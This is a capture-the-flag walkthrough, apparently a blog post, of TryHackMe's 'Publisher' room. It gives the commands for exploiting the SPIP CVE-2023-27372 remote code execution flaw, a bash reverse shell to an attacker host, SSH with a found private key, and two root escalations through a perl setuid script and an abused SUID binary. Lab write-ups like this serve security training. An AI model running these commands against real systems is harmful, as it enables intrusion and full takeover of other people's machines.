---
title: Publisher - TryHackMe Walkthrough
date: 2024-01-25 00:00:00 +0000
categories: [TryHackMe, Web Exploitation]
tags: [web, spip, rce, docker, privilege-escalation, tryhackme]
---

# Publisher - TryHackMe Walkthrough

![Publisher Room Banner](https://github.com/user-attachments/assets/9e1919d4-6a88-4bcf-9f67-1d28e61b7cac)

## Enumeration

### Nmap Scan
We start with a comprehensive nmap scan:
```bash
sudo nmap -sC -sV -T4 {target_IP}
```

The scan reveals two open ports:
- Port 22: OpenSSH 8.2p1 Ubuntu
- Port 80: Apache httpd 2.4.41

### Web Enumeration
The website appears to be a simple blog with no obvious functionality. Running a directory scan with feroxbuster reveals the `/spip` path.

![Publisher Homepage](https://github.com/user-attachments/assets/88eb3c30-693d-4126-a487-678a845fb8d0)

Using Wappalyzer, we identify that the site is running SPIP version 4.2.0.

![SPIP Version](https://github.com/user-attachments/assets/6d83eac2-5997-4116-8602-7605e1d5e8a6)

## Initial Access

Research reveals that SPIP 4.2.0 is vulnerable to Unauthenticated Remote Code Execution (CVE-2023-27372). We can exploit this using a publicly available exploit:

```bash
git clone https://github.com/Chocapikk/CVE-2023-27372.git
pip install -r requirements.txt
python CVE-2023-27372.py -u http://{target_IP}/spip/ -v -o report.txt
```

![RCE Success](https://github.com/user-attachments/assets/a949bd7d-2bf4-426c-a726-76072a9081f6)

### Getting a Reverse Shell
We establish a reverse shell using:
```bash
bash -c "bash -i >& /dev/tcp/{attacker_IP}/9001 0>&1"
```

![Reverse Shell](https://github.com/user-attachments/assets/a563c167-31f6-4adb-b566-cd989a0879bf)

## Lateral Movement

We discover we're in a Docker container. Manual enumeration reveals an SSH private key in the think user's home directory:

![SSH Key](https://github.com/user-attachments/assets/c2dff48d-d254-48d7-9610-408a223b381d)

We can use this key to gain SSH access as the think user:
```bash
ssh -i id_rsa think@{target_IP}
```

## Privilege Escalation

### Method 1: AppArmor Bypass
We discover AppArmor is running, which restricts file operations. After analyzing the AppArmor rules, we find we can write to `/dev/shm`:

```bash
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /dev/shm/test.pl
chmod +x /dev/shm/test.pl
./test.pl
```

### Method 2: SUID Binary Exploitation
We find a SUID binary `/usr/sbin/run_container` that executes `/opt/run_container.sh`. Since we have write permissions to this script, we can modify it to add SUID to `/bin/bash`:

```bash
echo 'chmod +s /bin/bash' > /opt/run_container.sh
/usr/sbin/run_container
/bin/bash -p
```

![Root Access](https://github.com/user-attachments/assets/53ae8c26-a233-4010-bebe-2637fbf6ff54)

## Alternative Method
From the www-data shell, we can:
1. Copy `/bin/bash` to `/home/think/spip`
2. Set SUID bit
3. Make it readable by everyone
4. Execute it from the SSH session

## Conclusion
This machine demonstrates several important security concepts:
- Web application vulnerabilities (SPIP RCE)
- Docker container escape
- AppArmor bypass techniques
- SUID binary exploitation
- Multiple privilege escalation paths

Remember: Always look for multiple ways to achieve your goal, as there might be more than one path to success. 